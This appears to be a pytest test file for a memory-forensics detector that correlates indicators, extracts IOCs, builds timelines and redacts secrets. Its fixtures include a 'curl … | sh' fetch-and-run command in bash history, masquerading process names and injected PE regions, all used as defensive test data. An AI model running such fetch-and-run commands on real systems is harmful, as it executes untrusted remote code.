# ruff: noqa: E501 - test data tables (long literal command lines, paths and regions)
"""`detections.run` as a whole: correlation, stable ids, IOCs, timeline, caps and `truncated`
flags, and that every output line is a valid `memory.v1` record."""

from typing import Any

import pytest
from cyberlab_jobs.memory import MEMORY_RECORD_ADAPTER, MemoryLimits, MemoryProfile

from dataset.baselines import WIN, Draft, bash, region, tcp
from dataset.scenarios import LIMITS, MZ_HEAD, SCENARIOS, build
from memory_worker import detections
from memory_worker.detections import base, timeline
from memory_worker.view import DetectionOutput

IMAGE: dict[str, Any] = {
    "kind": "image",
    "size_bytes": 1024,
    "sha256": "e" * 64,
    "layer": "WindowsIntel32e",
    "arch": "x64",
    "system_time": "2026-11-01T10:00:00Z",
}


def limits(**caps: int) -> MemoryLimits:
    return LIMITS.model_copy(update=caps)


def draft() -> Draft:
    d = Draft(os="windows", profile=MemoryProfile.TRIAGE, image=dict(IMAGE))
    d.add_process(3040, 2900, "explorer.exe", "C:\\Windows\\explorer.exe", 5)
    return d


def run(d: Draft, lim: MemoryLimits = LIMITS) -> DetectionOutput:
    return detections.run(d.view(), lim)


def noisy(n: int) -> Draft:
    """`n` look-alike processes, each one medium finding."""
    d = draft()
    for i in range(n):
        d.add_process(10_000 + i * 4, 3040, "scvhost.exe", "C:\\Windows\\scvhost.exe", 9)
    return d


# --- correlation ----------------------------------------------------------------------


def test_two_indicator_families_add_one_correlated_finding() -> None:
    d = draft()
    d.add_process(
        7600, 3040, "svhost.exe", "C:\\Users\\Public\\svhost.exe", 9, sources=("psscan",), threads=4
    )
    out = run(d)
    types = sorted(f.type for f in out.findings)
    assert types == ["mem_correlated_indicators", "mem_hidden_process", "mem_name_similar_to_core"]
    correlated = next(f for f in out.findings if f.type == "mem_correlated_indicators")
    others = {str(f.finding_id) for f in out.findings if f is not correlated}
    assert {
        r.removeprefix("finding:") for r in correlated.evidence_refs if r.startswith("finding:")
    } == others
    assert correlated.severity == "medium" and correlated.confidence >= 0.8
    # It never raises the others.
    assert all(f.severity == "medium" for f in out.findings)


def test_one_family_twice_is_not_a_combination() -> None:
    d = draft()
    d.injections += [
        region(3040, "explorer.exe", 0x10000, 0x1000, "PAGE_EXECUTE_READWRITE", MZ_HEAD),
        region(3040, "explorer.exe", 0x20000, 0x1000, "PAGE_EXECUTE_READWRITE", MZ_HEAD),
    ]
    assert sorted(f.type for f in run(d).findings) == ["mem_private_exec_pe", "mem_private_exec_pe"]


# --- ids, records ---------------------------------------------------------------------


def test_output_is_deterministic() -> None:
    first = detections.run(build("win_combined_indicators"), LIMITS)
    second = detections.run(build("win_combined_indicators"), LIMITS)
    assert first == second
    assert len({f.finding_id for f in first.findings}) == len(first.findings)


def test_finding_ids_depend_on_the_image() -> None:
    a = run(noisy(1))
    other = noisy(1)
    other.image["sha256"] = "f" * 64
    b = run(other)
    assert a.findings[0].finding_id != b.findings[0].finding_id


@pytest.mark.parametrize("name", sorted(SCENARIOS))
def test_every_output_line_is_a_valid_contract_record(name: str) -> None:
    out = detections.run(build(name), LIMITS)
    for record in [*out.findings, *out.iocs, *out.timeline]:
        line = record.model_dump_json()
        assert MEMORY_RECORD_ADAPTER.validate_json(line) == record


def test_findings_carry_the_image_time_and_heuristic_methods() -> None:
    out = run(noisy(1))
    finding = out.findings[0]
    assert finding.ts.isoformat() == "2026-11-01T10:00:00+00:00"
    assert finding.detection_method == "heuristic:mem_masquerade@1"
    assert finding.evidence_refs == ["pid:10000"]


# --- caps -----------------------------------------------------------------------------


def test_finding_cap_sets_the_flag_and_keeps_the_strongest() -> None:
    d = noisy(5)
    d.injections.append(
        region(3040, "explorer.exe", 0x10000, 0x1000, "PAGE_EXECUTE_READWRITE", "fc4883e4")
    )
    out = run(d, limits(max_findings=3))
    assert len(out.findings) == 3 and out.truncated.get("findings") is True
    assert all(f.severity == "medium" for f in out.findings)  # the low one went first


def test_no_flag_below_the_caps() -> None:
    assert run(noisy(3)).truncated == {}


def test_detector_state_cap(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(base, "MAX_DETECTOR_KEYS", 3)
    out = run(noisy(10))
    assert out.truncated.get("detector_state") is True
    assert len(out.findings) < 10


def test_ioc_cap() -> None:
    d = draft()
    d.connections += [
        tcp(3040, "explorer.exe", "10.0.0.15", 50000 + i, f"203.0.113.{i}", 443)
        for i in range(1, 9)
    ]
    out = run(d, limits(max_iocs=5))
    assert len(out.iocs) == 5 and out.truncated.get("iocs") is True


def test_timeline_overall_cap_keeps_system_time_and_findings() -> None:
    d = noisy(20)
    out = run(d, limits(max_timeline=10))
    assert len(out.timeline) == 10 and out.truncated.get("timeline") is True
    events = [e.event for e in out.timeline]
    assert "system_time" in events and events.count("finding") == 9


def test_timeline_per_kind_cap(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(timeline, "MAX_PROCESS_EVENTS", 5)
    d = draft()
    for i in range(10):
        d.add_process(9000 + i * 4, 3040, "worker.exe", "C:\\app\\worker.exe", 10 + i)
    out = run(d)
    starts = [e for e in out.timeline if e.event == "process_start"]
    assert len(starts) == 5 and out.truncated.get("timeline") is True
    assert starts[0].pid == 3040  # oldest first


# --- IOCs and timeline content ---------------------------------------------------------


def test_iocs_from_connections_command_lines_and_history() -> None:
    d = draft()
    d.add_process(
        7000,
        3040,
        "cmd.exe",
        WIN + "cmd.exe",
        9,
        cmdline="cmd /c curl http://downloads.example.net/a.zip",
    )
    d.connections += [
        tcp(7000, "cmd.exe", "10.0.0.15", 50001, "203.0.113.7", 443, minute=10),
        tcp(7000, "cmd.exe", "10.0.0.15", 50002, "203.0.113.7", 443, minute=12),
        tcp(7000, "cmd.exe", "127.0.0.1", 50003, "127.0.0.1", 80, minute=12),
        tcp(7000, "cmd.exe", "0.0.0.0", 445, state="LISTENING"),
    ]
    out = run(d)
    iocs = {(i.type, i.value): i for i in out.iocs}
    assert set(iocs) == {
        ("url", "http://downloads.example.net/a.zip"),
        ("domain", "downloads.example.net"),
        ("ip", "203.0.113.7"),
    }
    ip = iocs[("ip", "203.0.113.7")]
    assert ip.count == 2 and ip.source == "connection" and ip.first_seen < ip.last_seen
    assert iocs[("url", "http://downloads.example.net/a.zip")].source == "cmdline"


def test_secret_in_a_url_never_reaches_an_ioc() -> None:
    d = Draft(os="linux", profile=MemoryProfile.TRIAGE, image=dict(IMAGE, layer="LimeLayer"))
    d.artifacts.append(bash(1030, "git clone https://bob:hunter22pw@git.example.com/r.git", 3))
    out = detections.run(d.view(), LIMITS)
    assert out.iocs and all("hunter22pw" not in i.value for i in out.iocs)
    assert {i.source for i in out.iocs} == {"bash"}


@pytest.mark.parametrize(
    ("command", "secret"),
    [
        ("curl https://api.example.com/v1?token=Tok3nValue99&page=2", "Tok3nValue99"),
        ("wget https://x.example.com/a?access_token=ya29AfH6xx", "ya29AfH6xx"),
        ("curl 'https://blob.example.net/c?sv=2022&sig=AbCd3fGh'", "AbCd3fGh"),
        ("curl https://h.example.com/f?api_key=AIzaSyA1b2c3&x=1", "AIzaSyA1b2c3"),
        ("curl https://h.example.com/login?password=Pw0rdValue", "Pw0rdValue"),
        ("PGPASSWORD=s3cretPg psql -h db.example.com", "s3cretPg"),
    ],
)
def test_query_and_env_secrets_never_reach_an_ioc(command: str, secret: str) -> None:
    d = Draft(os="linux", profile=MemoryProfile.TRIAGE, image=dict(IMAGE, layer="LimeLayer"))
    d.artifacts.append(bash(1030, command, 3))
    d.add_process(1031, 1, "sh", None, 2, cmdline=command, sources=("pslist",))
    out = detections.run(d.view(), LIMITS)
    assert out.iocs and all(secret not in i.value for i in out.iocs)
    for record in [*out.findings, *out.timeline]:
        assert secret not in record.model_dump_json()


def test_history_time_becomes_ioc_time() -> None:
    d = Draft(os="linux", profile=MemoryProfile.TRIAGE, image=dict(IMAGE, layer="LimeLayer"))
    d.artifacts.append(bash(1030, "curl http://198.51.100.7/x.sh | sh", 7))
    out = detections.run(d.view(), LIMITS)
    url = next(i for i in out.iocs if i.type == "url")
    assert url.first_seen.isoformat() == "2026-11-01T08:07:00+00:00"


def test_timeline_events() -> None:
    d = noisy(1)
    d.add_process(9000, 3040, "old.exe", "C:\\old.exe", 20, exit_minute=25)
    d.connections.append(
        tcp(3040, "explorer.exe", "10.0.0.15", 50001, "203.0.113.7", 443, minute=30)
    )
    out = run(d)
    events = [e.event for e in out.timeline]
    assert events.count("system_time") == 1 and "process_exit" in events
    assert "connection" in events and "finding" in events
    assert [e.ts for e in out.timeline] == sorted(e.ts for e in out.timeline)
    finding_event = next(e for e in out.timeline if e.event == "finding")
    assert finding_event.ref == str(out.findings[0].finding_id) and finding_event.pid == 10000


def test_image_without_system_time_still_runs() -> None:
    d = noisy(1)
    d.image["system_time"] = None
    out = run(d)
    assert out.findings and all(e.event != "system_time" for e in out.timeline)


def test_empty_view_yields_only_the_system_time_event() -> None:
    d = Draft(os="windows", profile=MemoryProfile.TRIAGE, image=dict(IMAGE))
    out = run(d)
    assert out.findings == [] and out.iocs == [] and out.truncated == {}
    assert [e.event for e in out.timeline] == ["system_time"]
